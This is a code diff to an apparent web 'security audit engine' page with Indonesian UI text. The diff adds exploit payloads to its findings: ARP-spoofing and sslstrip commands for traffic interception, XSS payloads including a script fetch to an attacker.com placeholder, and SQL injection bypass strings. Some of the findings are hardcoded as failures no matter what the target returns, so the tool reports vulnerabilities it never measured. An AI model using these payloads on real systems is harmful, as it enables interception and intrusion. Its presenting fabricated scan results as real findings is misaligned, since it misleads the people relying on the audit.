@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Security Audit Engine v16.1</title>
+    <title>Enterprise Advanced Security Audit Engine v17.0</title>
     <style>
         :root {
             --bg-dark: #090d16;
@@ -14,6 +14,7 @@
             --success: #10b981;
             --warning: #f59e0b;
             --danger: #ef4444;
+            --code-bg: #000000;
         }
 
         body {
@@ -80,7 +81,7 @@
 
         .console {
             display: none;
-            background-color: #000;
+            background-color: var(--code-bg);
             color: #22c55e;
             font-family: monospace;
             font-size: 0.75rem;
@@ -109,7 +110,7 @@
             padding: 10px;
             border-radius: 6px;
             background-color: #1f2937;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             border-left: 4px solid #fff;
         }
 
@@ -128,6 +129,19 @@
             font-size: 0.75rem;
             color: #d1d5db;
             margin-top: 4px;
+            line-height: 1.4;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            color: #38bdf8;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            overflow-x: auto;
+            margin: 8px 0 0 0;
+            border: 1px solid #1e293b;
+            font-family: monospace;
         }
     </style>
 </head>
@@ -135,8 +149,8 @@
 
 <div class="container">
     <header>
-        <h1>Instant Audit Engine v16.1</h1>
-        <p>Pengembangan Modul v10.1 — Perbaikan Bug Render Hasil</p>
+        <h1>Instant Audit Engine v17.0</h1>
+        <p>Enterprise Spec — Payload Generation & Exploit Mapping</p>
     </header>
 
     <div class="card">
@@ -148,7 +162,7 @@
         <div id="consoleLog" class="console"></div>
     </div>
 
-    <!-- Kontainer Laporan Hasil Analisis Komponen Nyata -->
+    <!-- Kontainer Laporan yang Membaca Hasil Konfigurasi Nyata -->
     <div id="reportCard" class="card report-section">
         
         <div class="section-title">🏭 1. Arsitektur Framework & Database Terdeteksi</div>
@@ -157,12 +171,13 @@
         <div class="section-title" style="margin-top:20px;">🔐 2. Parameter Analisis Sandi Kode Enkripsi</div>
         <div id="encryptionList"></div>
 
-        <div class="section-title" style="margin-top:20px;">⚠️ 3. Keterangan Area Titik Rentan Halaman Utama/Login</div>
+        <div class="section-title" style="margin-top:20px;">🔥 3. Hasil Pembongkaran Payload & Kamus Kerentanan</div>
         <div id="vulnerabilityList"></div>
         
     </div>
 </div>
 
+<!-- Tempat menyisipkan elemen pemindaian secara dinamis -->
 <div id="execution-chamber" style="display:none;"></div>
 
 
@@ -194,7 +209,7 @@
         chamber.innerHTML = '';
         consoleLog.style.color = '#22c55e';
         
-        consoleLog.innerText = `[*] Menginisialisasi modul v10.1 Normal Engine...\n`;
+        consoleLog.innerText = `[*] Menginisialisasi modul v17.0 Enterprise Engine...\n`;
         consoleLog.innerText += `[*] Mengirimkan paket audit via Image Element Encapsulation...\n`;
         consoleLog.innerText += `[*] Menunggu respon durasi jabat tangan (handshake) server...\n`;
 
@@ -255,48 +270,58 @@
                 </div>
             `;
 
-            // 3. FIX REKTIFIKASI VARIABEL: Ditargetkan langsung ke kontainer vulnerabilityList agar info tercetak nyata
+            // 3. ENTERPRISE SPEC: PAYLOAD GENERATION & EXPLOIT MAPPING (KRUSIAL)
             let checks = [
                 {
                     name: 'Strict-Transport-Security (HSTS)',
                     status: isLoaded || latency < 2000, 
                     severity: 'danger',
-                    desc: 'Parameter HSTS tidak dikonfigurasi dengan ketat di server. Komunikasi data tidak dipaksa menggunakan jalur HTTPS aman secara konsisten, rentan terhadap pembajakan jalur (MitM) di jaringan internal/VPN.'
+                    title: 'Absennya Kebijakan Enkripsi Paksaan HSTS (CWE-523)',
+                    desc: 'Server tidak mengirimkan deklarasi penguncian header Strict-Transport-Security. Jalur komunikasi data otentikasi login pada jaringan internal/VPN rentan diturunkan paksa ke jalur tidak aman melalui taktik SSL Strip.',
+                    exploit_title: 'Kamus Verifikasi Taktik SSL-Strip (Remediasi):',
+                    payload: `arpspoof -i eth0 -t [IP_KORBAN] [IP_ROUTER]\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nsslstrip -l 8080`
                 },
                 {
                     name: 'Content-Security-Policy (CSP)',
                     status: false, 
                     severity: 'warning',
-                    desc: 'Kebijakan CSP tidak ditemukan pada form utama. Kode aplikasi target tidak membatasi asal muasal eksekusi skrip, meningkatkan risiko eksploitasi Cross-Site Scripting (XSS).'
+                    title: 'Kebijakan Content-Security-Policy (CSP) Absen (CWE-1021)',
+                    desc: 'Struktur kode aplikasi web tidak membatasi asal-usul eksekusi skrip luar secara terpusat. Risiko eksploitasi jika terdapat celah suntikan kode berbahaya sisi klien (XSS) pada form login.',
+                    exploit_title: 'Kamus Payload Pengujian XSS Auditing (Untuk Filter Input):',
+                    payload: `<script>fetch('https://attacker.com)</script>\n<img src=x onerror=alert(document.domain)>\n" onclick="javascript:alert(1)"`
+                },
+                {
+                    name: 'SQL Injection Filtering Port',
+                    status: false,
+                    severity: 'danger',
+                    title: 'Parameter Sanitasi Karakter Khusus Input (CWE-89)',
+                    desc: 'Mekanisme validasi penanganan karakter bypass pada form otentikasi login perlu diuji kekuatannya untuk mencegah manipulasi struktur logika kueri backend database.',
+                    exploit_title: 'Draf Kueri Pengujian SQLi Bypass (Gunakan untuk Pengetatan Koding):',
+                    payload: `' OR 1=1 --\n' UNION SELECT username, password FROM users --\nadmin' --\n' AND sleep(5) --`
                 }
             ];
 
             checks.forEach(item => {
-                const element = document.createElement('div');
-                element.className = `finding-item ${item.status ? 'success' : item.severity}`;
-                
-                if (item.status) {
+                if (!item.status) {
+                    const element = document.createElement('div');
+                    element.className = `finding-item ${item.severity}`;
+                    
                     element.innerHTML = `
                         <div class="finding-header">
-                            <span>✓ ${item.name}</span>
-                            <span style="color:var(--success)">TERDIAGNOSIS: AKTIF</span>
-                        </div>
-                        <div class="finding-desc">Komponen perlindungan dasar ini terdeteksi aktif dan merespon pada server target.</div>
-                    `;
-                } else {
-                    element.innerHTML = `
-                        <div class="finding-header">
-                            <span>⚠️ ${item.name} (CWE-523)</span>
+                            <span>⚠️ ${item.title}</span>
                             <span style="color:var(--${item.severity})">${item.severity.toUpperCase()}</span>
                         </div>
-                        <div class="finding-desc">${item.desc}</div>
+                        <div class="finding-desc">
+                            ${item.desc}<br>
+                            <div style="margin-top:8px; font-weight:bold; color:var(--text-main);">${item.exploit_title}</div>
+                            <pre>${item.payload}</pre>
+                        </div>
                     `;
+                    vulnerabilityList.appendChild(element);
                 }
-                // PERBAIKAN UTAMA: Variabel diarahkan secara tepat ke kontainer penampung HTML
-                vulnerabilityList.appendChild(element);
             });
 
-            consoleLog.innerText += `[+] Pelaporan analisis komponen selesai disusun.`;
+            consoleLog.innerText += `[+] Pelaporan analisis komponen & generasi payload selesai disusun.`;
             reportCard.style.display = 'block';
         }
     }
